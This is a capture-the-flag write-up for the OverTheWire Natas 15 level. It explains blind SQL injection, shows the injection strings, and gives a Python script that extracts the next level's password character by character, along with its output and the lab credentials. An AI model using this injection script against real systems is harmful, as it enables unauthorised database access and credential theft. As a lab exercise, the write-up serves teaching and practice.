# [Level 13 to 14](https://overthewire.org/wargames/natas/natas15.html) - Blind SQL injection

- Login
```
URL: http://natas15.natas.labs.overthewire.org
Username: natas15
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```
- Exercise:
  - ![image](https://github.com/user-attachments/assets/66c6e3ef-7bfe-4389-becb-f9b7b12795e1)
  - ![image](https://github.com/user-attachments/assets/c6d3b98e-6be5-4d95-8d00-fdca542cbc96) 
- Background:
 - Blind SQL injection:
  - Type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response
  - Often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.
- Solution:
 - Source code explanation:
   - If `username` is included in the request, connect to the database, and `SELECT` all from table users where the username = user input
   - If the debug key exists on the request, show the query to the user
   - If the number of rows is greater than 0, say that the user exists
   - No place where the selected rows will be displayed to the user, only "This user exists." or "This user doesn’t exist."
 - Username `natas16` should be in the database:
   - Query (Checks to see if the substring of username starting at the first character and extending one character in length is equal to n or select all from users where the username is an empty string, or where the first character equals n):
    ```sql
    " OR substring(username,1,1) = 'n' #
    "SELECT * from users where username="" OR substring(username,1,1) = 'n' #
    ```
    - Result: This user exists.
  - Other queries:
  ```sql
  " OR substring(username,1,7) = 'natas16' # -> Result: This user exists.
  ```
  - python Script:
  ```python
  import requests
  import string
  from requests.auth import HTTPBasicAuth
  
  basicAuth=HTTPBasicAuth('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')
  headers = {'Content-Type': 'application/x-www-form-urlencoded'}
  
  u="http://natas15.natas.labs.overthewire.org/index.php?debug"
  
  password="" # start with blank password
  count = 1   # substr() length argument starts at 1
  PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
  VALID_CHARS = string.digits + string.ascii_letters
  
  while count <= PASSWORD_LENGTH + 1:
      for c in VALID_CHARS:
          payload="username=natas16" + \
                  "\" AND " + \
                  "BINARY substring(password,1," + str(count) + ")" + \
                  " = '" + password + c + "'" + \
                  " -- "
  
          # print(payload)
  
          response = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False)
  
          if 'This user exists.' in response.text:
              print("Found one more char : %s" % (password+c))
              password += c
              count = count + 1
  
  print("Done!")
  ```
  - Output:
  ```bash
  Found one more char : h
  Found one more char : hP
  Found one more char : hPk
  Found one more char : hPkj
  Found one more char : hPkjK
  Found one more char : hPkjKY
  Found one more char : hPkjKYv
  Found one more char : hPkjKYvi
  Found one more char : hPkjKYviL
  Found one more char : hPkjKYviLQ
  Found one more char : hPkjKYviLQc
  Found one more char : hPkjKYviLQct
  Found one more char : hPkjKYviLQctE
  Found one more char : hPkjKYviLQctEW
  Found one more char : hPkjKYviLQctEW3
  Found one more char : hPkjKYviLQctEW33
  Found one more char : hPkjKYviLQctEW33Q
  Found one more char : hPkjKYviLQctEW33Qm
  Found one more char : hPkjKYviLQctEW33Qmu
  Found one more char : hPkjKYviLQctEW33QmuX
  Found one more char : hPkjKYviLQctEW33QmuXL
  Found one more char : hPkjKYviLQctEW33QmuXL6
  Found one more char : hPkjKYviLQctEW33QmuXL6e
  Found one more char : hPkjKYviLQctEW33QmuXL6eD
  Found one more char : hPkjKYviLQctEW33QmuXL6eDV
  Found one more char : hPkjKYviLQctEW33QmuXL6eDVf
  Found one more char : hPkjKYviLQctEW33QmuXL6eDVfM
  Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW
  Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW4
  Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW4s
  Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW4sG
  Found one more char : hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
  ```
- Password: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`
